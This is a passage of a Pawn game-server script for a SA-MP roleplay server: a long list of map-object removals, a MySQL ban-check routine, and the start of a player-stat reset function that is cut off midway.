RemoveBuildingForPlayer(playerid, 3672, 1617.2813, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 3672, 1754.1719, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 3629, 1617.2813, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1649.0625, -2641.4063, 18.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3629, 1682.7266, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 3629, 1754.1719, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 3629, 1822.7344, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1855.7969, -2641.4063, 18.4766, 0.25);
RemoveBuildingForPlayer(playerid, 3629, 1889.6563, -2666.0078, 18.8828, 0.25);
RemoveBuildingForPlayer(playerid, 1290, 1922.2031, -2641.4063, 18.4766, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2273.4609, 1596.4766, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2268.7188, 1596.4688, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2273.4609, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2268.7188, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2263.6563, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2258.2578, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2253.2344, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2263.6563, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2258.2578, 1596.4766, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2253.2344, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2254.1797, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2259.2188, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2264.6250, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2269.6719, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2274.4063, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2274.4063, 1589.7891, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2269.6563, 1589.7891, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2264.6094, 1589.7891, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2259.1875, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2786, 2254.1563, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2216.5703, 1588.0938, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2216.5781, 1588.5703, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2216.5703, 1592.3984, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2216.5781, 1592.8750, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1833, 2217.0156, 1602.8125, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1833, 2217.5469, 1602.7969, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2217.0234, 1603.9297, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1835, 2217.0156, 1605.0469, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 2592, 2217.0313, 1603.9219, 1006.0781, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2217.5469, 1603.8984, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2592, 2217.5469, 1603.9141, 1006.0781, 0.25);
RemoveBuildingForPlayer(playerid, 1834, 2217.5469, 1605.0391, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2216.5703, 1614.2422, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2216.5781, 1614.7188, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2216.5703, 1618.5781, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2216.5781, 1619.0547, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2220.7188, 1588.0938, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6328, 1588.0781, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6641, 1588.6016, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2220.6953, 1588.5703, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2218.6172, 1588.3359, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2230.5703, 1589.1875, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2242.3672, 1589.1875, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6328, 1592.3828, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6641, 1592.9063, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2218.6172, 1592.6406, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2220.7188, 1592.3984, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2220.6953, 1592.8750, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2230.5703, 1594.7578, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2242.3672, 1594.7578, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1833, 2220.6719, 1602.8125, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1833, 2221.2031, 1602.7969, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2230.3750, 1602.7500, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2241.3125, 1602.7500, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2220.6797, 1603.9297, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2221.2031, 1603.8984, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2592, 2220.6875, 1603.9219, 1006.0781, 0.25);
RemoveBuildingForPlayer(playerid, 2592, 2221.2031, 1603.9141, 1006.0781, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2243.1250, 1604.4375, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2232.1875, 1604.4375, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2239.4297, 1604.4531, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2228.4922, 1604.4531, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 1834, 2221.2031, 1605.0391, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1835, 2220.6719, 1605.0469, 1005.9844, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2241.3125, 1606.2734, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2188, 2230.3750, 1606.2734, 1006.1563, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6328, 1614.2266, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2220.7188, 1614.2422, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2218.6172, 1614.4844, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6641, 1614.7500, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2220.6953, 1614.7188, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2230.5703, 1614.5938, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2241.4453, 1614.5547, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2220.7188, 1618.5781, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6328, 1618.5625, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2218.6641, 1619.0859, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2220.6953, 1619.0547, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2218.6172, 1618.8203, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2230.5703, 1619.6563, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1978, 2241.4453, 1619.6094, 1006.2266, 0.25);
RemoveBuildingForPlayer(playerid, 1895, 2252.0313, 1584.4219, 1007.1094, 0.25);
RemoveBuildingForPlayer(playerid, 1895, 2261.6328, 1584.4297, 1007.1094, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2264.6094, 1589.7891, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2263.6563, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2258.2578, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2253.2344, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2259.1875, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2254.1563, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2258.2578, 1596.4766, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2263.6563, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2253.2344, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2254.1797, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2259.2188, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2264.6250, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2253.1250, 1609.6406, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2255.1563, 1609.6016, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2257.2422, 1609.6406, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2255.2109, 1609.8750, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2253.1016, 1610.1172, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2257.2500, 1610.1172, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2255.1875, 1610.1250, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2253.1016, 1614.1641, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2253.1250, 1613.6875, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2255.1563, 1613.6484, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2257.2500, 1614.1641, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2257.2422, 1613.6875, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2255.1875, 1614.1719, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2255.2109, 1613.9141, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2253.1250, 1617.5781, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2257.2422, 1617.5781, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2255.1563, 1617.5469, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2255.2109, 1617.8125, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2253.1016, 1618.0547, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2257.2500, 1618.0547, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2255.1875, 1618.0703, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1895, 2271.7266, 1584.4219, 1007.1094, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2268.7188, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2269.6563, 1589.7891, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2268.7188, 1596.4688, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2269.6719, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2269.2578, 1604.5938, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2269.7344, 1604.6172, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2269.7734, 1606.6484, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2269.2578, 1608.7422, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2269.2500, 1606.6797, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2269.7344, 1608.7344, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2269.5078, 1606.7031, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2273.4609, 1589.7969, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2274.4063, 1589.7891, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2273.4609, 1596.4766, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2785, 2274.4063, 1596.4844, 1006.0156, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2273.2969, 1606.6797, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2273.3047, 1604.5938, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1837, 2273.3047, 1608.7422, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 2784, 2273.5469, 1606.7031, 1006.4922, 0.25);
RemoveBuildingForPlayer(playerid, 2325, 2273.8203, 1606.6484, 1006.7656, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2273.7813, 1604.6172, 1006.0000, 0.25);
RemoveBuildingForPlayer(playerid, 1836, 2273.7813, 1608.7344, 1006.0000, 0.25);
//=========================== Удаленные объекты Мэрии =====================
RemoveBuildingForPlayer(playerid, 1283, 1441.8594, -1733.0078, 15.6250, 0.25);
RemoveBuildingForPlayer(playerid, 1226, 1451.6250, -1727.6719, 16.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1226, 1467.9844, -1727.6719, 16.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1226, 1485.1719, -1727.6719, 16.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1716.7031, 15.6250, 0.25);
RemoveBuildingForPlayer(playerid, 1226, 1505.1797, -1727.6719, 16.4219, 0.25);
RemoveBuildingForPlayer(playerid, 1283, 1513.2344, -1732.9219, 15.6250, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1479.6953, -1702.5313, 15.6250, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1692.3906, 15.6328, 0.25);
RemoveBuildingForPlayer(playerid, 1231, 1479.3828, -1682.3125, 15.6328, 0.25);
// Колесо
RemoveBuildingForPlayer(playerid, 6463, 389.7734, -2028.4688, 19.8047, 0.5);
RemoveBuildingForPlayer(playerid, 3751, 389.8750, -2035.3828, 29.9531, 50);
RemoveBuildingForPlayer(playerid, 6298, 389.7734, -2028.4688, 19.8047, 0.5);
// завод
RemoveBuildingForPlayer(playerid, 941, -2157.77709961,-248.69999695,36.00000000, 20.1);
RemoveBuildingForPlayer(playerid, 11090, -2153.0676,-266.0621,36.5156, 10.1);
RemoveBuildingForPlayer(playerid, 943, -2153.0676,-266.0621,36.5156, 10.1);
// Coda
RemoveBuildingForPlayer(playerid, 1209, -2420.2188,   984.5781,   44.2969, 0.1); // P'n'S около Jizzy
RemoveBuildingForPlayer(playerid, 1302, -2420.1797,   985.9453,   44.2969, 0.1); // P'n'S около Jizzy
// Chips
RemoveBuildingForPlayer(playerid,  956,  1634.1094, -2237.5313,   12.8906, 0.1); // LS, Airport International
RemoveBuildingForPlayer(playerid,  956,  2139.5156, -1161.4844,   23.3594, 0.1); // LS, Jefferson
RemoveBuildingForPlayer(playerid,  956,  2153.2344, -1016.1484,   62.2344, 0.1); // LS, Las Colinas
RemoveBuildingForPlayer(playerid,  956,  2480.8594, -1959.2734,   12.9609, 0.1); // LS, Willowfield
RemoveBuildingForPlayer(playerid,  956, -2229.1875,   286.4141,   34.7031, 0.1); // SF, Park behind Build
RemoveBuildingForPlayer(playerid,  956, -1350.1172,   493.8594,   10.5859, 0.1); // SF, Avianosec
RemoveBuildingForPlayer(playerid,  956,  1398.8438,  2222.6094,   10.4219, 0.1); // LV, Redsans West, Baseball
RemoveBuildingForPlayer(playerid,  956,  1659.4609,  1722.8594,   10.2188, 0.1); // LV, Airport, Binco
RemoveBuildingForPlayer(playerid,  956,  2647.6953,  1129.6641,   10.2188, 0.1); // LV, Come-a-lot, Gas Station
RemoveBuildingForPlayer(playerid,  956,  2845.7266,  1295.0469,   10.7891, 0.1); // LV, Linden Stantion
RemoveBuildingForPlayer(playerid,  956,   662.4297,  -552.1641,   15.7109, 0.1); // Dillmore, Gas Station
RemoveBuildingForPlayer(playerid,  956,  2271.7266,   -76.4609,   25.9609, 0.1); // Palomino Creek, Library
RemoveBuildingForPlayer(playerid,  956, -1455.1172,  2591.6641,   55.2344, 0.1); // El Quebrados
RemoveBuildingForPlayer(playerid,  956,  -253.7422,  2599.7578,   62.2422, 0.1); // Las Payasadas
RemoveBuildingForPlayer(playerid,  956,   -76.0313,  1227.9922,   19.1250, 0.1); // Fort Carson
RemoveBuildingForPlayer(playerid, 1776,  2155.8438,  1607.8750, 1000.0625, 0.1); // Int 1, LV, Caligula Hall
RemoveBuildingForPlayer(playerid, 1776,  2202.4531,  1617.0078, 1000.0625, 0.1); // Int 1, LV, Caligula Warehouse
RemoveBuildingForPlayer(playerid, 1776,  2209.2422,  1621.2109, 1000.0625, 0.1); // Int 1, LV, Caligula Warehouse
RemoveBuildingForPlayer(playerid, 1776,  2222.3672,  1602.6406, 1000.0625, 0.1); // Int 1, LV, Caligula Garage
RemoveBuildingForPlayer(playerid, 1776,   330.6797,   178.5000, 1020.0703, 0.1); // Int 3, LV, Architec, 3rd Floor
RemoveBuildingForPlayer(playerid, 1776,   331.9219,   178.5000, 1020.0703, 0.1); // Int 3, LV, Architec, 3rd Floor
RemoveBuildingForPlayer(playerid, 1776,   350.9063,   206.0859, 1008.4766, 0.1); // Int 3, LV, Architec, Office
RemoveBuildingForPlayer(playerid, 1776,   361.5625,   158.6172, 1008.4766, 0.1); // Int 3, LV, Architec, Hall
RemoveBuildingForPlayer(playerid, 1776,   371.5938,   178.4531, 1020.0703, 0.1); // Int 3, LV, Architec, 3rd Floor
RemoveBuildingForPlayer(playerid, 1776,   374.8906,   188.9766, 1008.4766, 0.1); // Int 3, LV, Architec, Lounge Hall
RemoveBuildingForPlayer(playerid, 1776,   379.0391,  -178.8828, 1000.7344, 0.1); // Int 17, Ring Donut
RemoveBuildingForPlayer(playerid, 1776,   500.5625,    -1.3672, 1000.7344, 0.1); // Int 17, Club Alhambra
RemoveBuildingForPlayer(playerid, 1776,   -33.8750,  -186.7656, 1003.6328, 0.1); // 24/7
RemoveBuildingForPlayer(playerid, 1776,   -16.5313,  -140.2969, 1003.6328, 0.1); // 24/7
RemoveBuildingForPlayer(playerid, 1776,   -17.5469,   -91.7109, 1003.6328, 0.1); // 24/7
RemoveBuildingForPlayer(playerid, 1776,   -36.1484,   -57.8750, 1003.6328, 0.1); // 24/7
// Sprunk
RemoveBuildingForPlayer(playerid,  955, -2118.9688,  -423.6484,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2118.6172,  -422.4141,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2097.2734,  -398.3359,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2092.0859,  -490.0547,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2068.5625,  -398.3359,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2063.2734,  -490.0547,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2039.8516,  -398.3359,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2034.4609,  -490.0547,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2011.1406,  -398.3359,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -2005.6484,  -490.0547,   34.7266, 0.1); // SF, Stadium
RemoveBuildingForPlayer(playerid,  955, -1980.7891,   142.6641,   27.0703, 0.1); // SF, Depot
RemoveBuildingForPlayer(playerid,  955, -1350.1172,   492.2891,   10.5859, 0.1); // SF, Avianosec
RemoveBuildingForPlayer(playerid,  955,  -862.8281,  1536.6094,   21.9844, 0.1); // Las Barrancas, Cow
RemoveBuildingForPlayer(playerid,  955,  -253.7422,  2597.9531,   62.2422, 0.1); // Las Payasadas, Place
RemoveBuildingForPlayer(playerid,  955,   -14.7031,  1175.3594,   18.9531, 0.1); // Fort Carson, Cow
RemoveBuildingForPlayer(playerid,  955,   201.0156,  -107.6172,    0.8984, 0.1); // Blueberry
RemoveBuildingForPlayer(playerid, 1775,   373.8281,  -178.1406, 1000.7344, 0.1); // Int 17, Ring Donut
RemoveBuildingForPlayer(playerid, 1775,   501.8281,    -1.4297, 1000.7344, 0.1); // Int 17, Club Alhambra
RemoveBuildingForPlayer(playerid, 1775,   495.9688,   -24.3203, 1000.7344, 0.1); // Int 17, Club Alhambra (Exit)
RemoveBuildingForPlayer(playerid,  955,  1154.7266, -1460.8906,   15.1563, 0.1); // LS, Market
RemoveBuildingForPlayer(playerid,  955,  1277.8359,   372.5156,   18.9531, 0.1); // Montgomery, Paper Cuts
RemoveBuildingForPlayer(playerid,  955,  1520.1484,  1055.2656,   10.0000, 0.1); // LV, LVA Freight Depot
RemoveBuildingForPlayer(playerid,  955,  1729.7891, -1943.0469,   12.9453, 0.1); // LS, Uniti Station
RemoveBuildingForPlayer(playerid,  955,  1789.2109, -1369.2656,   15.1641, 0.1); // LS, Downtown
RemoveBuildingForPlayer(playerid,  955,  1928.7344, -1772.4453,   12.9453, 0.1); // LS, Idlewood
RemoveBuildingForPlayer(playerid,  955,  2060.1172, -1897.6406,   12.9297, 0.1); // LS, Willowfield
RemoveBuildingForPlayer(playerid,  955,  2085.7734,  2071.3594,   10.4531, 0.1); // LV, Sexshop
RemoveBuildingForPlayer(playerid, 1775,  2155.9063,  1606.7734, 1000.0547, 0.1); // Int 1, LV, Caligula Hall
RemoveBuildingForPlayer(playerid, 1775,  2209.9063,  1607.1953, 1000.0547, 0.1); // Int 1, LV, Caligula Stolovaja
RemoveBuildingForPlayer(playerid, 1775,  2222.2031,  1606.7734, 1000.0547, 0.1); // Int 1, LV, Caligula Garage
RemoveBuildingForPlayer(playerid, 1775,  2225.2031, -1153.4219, 1025.9063, 0.1); // Int 15, LS, Jefferson Hotel
RemoveBuildingForPlayer(playerid,  955,  2319.9922,  2532.8516,   10.2188, 0.1); // LV, Julius Threway North, Pizza
RemoveBuildingForPlayer(playerid,  955,  2325.9766, -1645.1328,   14.2109, 0.1); // LS, East, Green Bar
RemoveBuildingForPlayer(playerid,  955,  2352.1797, -1357.1563,   23.7734, 0.1); // LS, East, Liquor
RemoveBuildingForPlayer(playerid,  955,  2503.1406,  1243.6953,   10.2188, 0.1); // LV, The Camel's Toe
RemoveBuildingForPlayer(playerid, 1775,  2576.7031, -1284.4297, 1061.0938, 0.1); // Int 2, LS, Crackpalace
RemoveBuildingForPlayer(playerid, 1775,   -19.0391,   -57.8359, 1003.6328, 0.1); // Int #, 24/7
RemoveBuildingForPlayer(playerid, 1775,   -16.1172,   -91.6406, 1003.6328, 0.1); // Int #, 24/7
RemoveBuildingForPlayer(playerid, 1775,   -32.4453,  -186.6953, 1003.6328, 0.1); // Int #, 24/7
RemoveBuildingForPlayer(playerid, 1775,   -35.7266,  -140.2266, 1003.6328, 0.1); // Int #, 24/7
RemoveBuildingForPlayer(playerid, 1775,   -15.1016,  -140.2266, 1003.6328, 0.1); // Int #, 24/7
//
RemoveBuildingForPlayer(playerid, 1411, 347.1953, 1799.2656, 18.7578, 0.25);
RemoveBuildingForPlayer(playerid, 1411, 342.9375, 1796.2891, 18.7578, 0.25);
//
RemoveBuildingForPlayer(playerid, 16094, 191.1406, 1870.0391, 21.4766, 0.25);
RemoveBuildingForPlayer(playerid, 1491,    2577.4607,-1285.6855,1054.6406, 5.0); // Door in RM
RemoveBuildingForPlayer(playerid, 1491,    2543.8152,-1304.9309,1054.6406, 5.0); // Door in LCN
RemoveBuildingForPlayer(playerid, 1499,    2522.2883,-1301.9073,1048.2891, 5.0); // Door in LCN
RemoveBuildingForPlayer(playerid, 1499,    2577.83007812,-1291.40002441,1043.10998535, 5.0); // Door in Zona 51
RemoveBuildingForPlayer(playerid, 1499,    2571.1213,-1301.9087,1044.1250, 5.0); // Door in LCN
RemoveBuildingForPlayer(playerid, 1499,    2530.6880,-1305.5405,1048.2957, 5.0); // Door in Zona 51
//
RemoveBuildingForPlayer(playerid, 2074, 419.3281, 2538.5391, 12.5234, 0.25);
RemoveBuildingForPlayer(playerid, 16408, 418.2266, 2538.8516, 11.4297, 0.25);
RemoveBuildingForPlayer(playerid, 1810, 418.7344, 2538.7578, 8.9844, 0.25);
RemoveBuildingForPlayer(playerid, 2147, 413.9688, 2538.2188, 8.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1748, 418.2734, 2541.0625, 9.7891, 0.25);
RemoveBuildingForPlayer(playerid, 1810, 417.6328, 2542.5000, 8.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1812, 416.2422, 2540.3359, 8.9766, 0.25);
RemoveBuildingForPlayer(playerid, 1810, 418.2031, 2539.9063, 8.9844, 0.25);
RemoveBuildingForPlayer(playerid, 1763, 421.0781, 2540.8125, 8.9844, 0.25);
return true;
}
//==============================================================================
stock CheckBanList(playerid)
{
new vas[32], unbandate, ban, ip[24];
GetPlayerIp(playerid, ip, 20);
format(query, 128, "SELECT * FROM bans WHERE name = '%s'", PlayerInfo[playerid][pSendername]);
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row(query))
{
mysql_get_field("unbandate", vas);
unbandate = strval(vas);
if(unbandate - gettime() > 0) ban = 1;
}
if(ban == 0)
{
format(query, 128, "SELECT * FROM bans WHERE ip = '%s'", ip);
mysql_query(query);
mysql_store_result();
if(mysql_fetch_row(query))
{
mysql_get_field("unbandate", vas); unbandate = strval(vas);
if(unbandate - gettime() > 0) ban = 1;
}
}
if(ban == 1)
{
convert((unbandate-gettime())*1000,UBMin,UBSec,UBMSec);
UBHour = UBMin/60;
UBMin = UBMin%60;
UBDay = UBHour/24;
UBHour = UBHour%24;
format(totalstring, 128, "{bda400}      Ваш аккаунт заблокирован\n\nДата разблокировки через: %d дней",UBDay+1);
ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "{0ec200}Аккаунт заблокирован", totalstring, "/quit", "");
GKick(playerid);
}
mysql_free_result();
}
//==============================================================================
stock ResetStats(playerid)
{
PlayerRadio[playerid] = 0; PlayerTied[playerid] = false; pickupentered[playerid] = 0;
acstruct[playerid][checkmaptp] = 0; pDice[playerid] = 0; PlayerInfo[playerid][pSportEXP] = 0; PlayerInfo[playerid][pMask] = 0;
PlayerInfo[playerid][pHospital] = 0; PlayerInfo[playerid][pTruckSkill] = 0; PlayerInfo[playerid][pZakon]= 0; PlayerInfo[playerid][ProverkaIP]= 0;
PlayerInfo[playerid][pWatch]= 0; PlayerInfo[playerid][pCiggare] = 0; PlayerInfo[playerid][pSprunk] = 0;
ChosenSkin[playerid] = 0; SelectCharID[playerid] = 0; SelectCharPlace[playerid] = 0; PlayerInfo[playerid][pPhoneBalance] = 0;
PlayerLogged[playerid] = 0; PlayerLogTries[playerid] = 0; SendAdmin[playerid] = 1; PPC[playerid] = false; SendFamily[playerid] = 1;
BigEar[playerid] = 0; PlayerStats[playerid] = 0; ClothesRound[playerid] = 0; ClothesRun[playerid] = 0; PlayerCuffed[playerid] = false;
VehicleHealNow[playerid] = 0; times[playerid] = true; nowvehheal[playerid] = 0.0;  VehRe[playerid] = false; rent_Vehicle[playerid] = 0;
PlayerArmour[playerid] = 0.00; HouseOffer[playerid] = 999; HousePrice[playerid] = 0; PlayerHealP[playerid] = 0;
InShop[playerid] = 0; SelectCharRegID[playerid] = 0; AdminLogged[playerid] = false;
PlayerLastTick[playerid] = GetTickCount(); TimeLogged[playerid] = 0; Ether[playerid] = false;
EtherCall[0] = false; EtherCall[1] = false; EtherSms[0] = false; EtherSms[1] = false; EtherLive[playerid] = false;
MedicCallTime[playerid] = 0; TazerTime[playerid] = 0; FuelTime[playerid] = 0; ProductTime[playerid] = 0; Product_time[playerid] = 0;
Mobile[playerid] = -1; CellTime[playerid] = -1; Phone[playerid] = true; EtherCalled[playerid] = false;
_Factory[playerid] = 0; materials_Status[playerid] = 0; materials_Time[playerid] = 0; GunCheckTime[playerid] = 0; MatsFactTime[playerid] = 0;
getDuty_Reg[playerid] = -1; InShopSkin[playerid] = 0; lictest_Time[playerid] = 0; TaxiCallTime[playerid] = 0; MechCallTime[playerid] = 0;
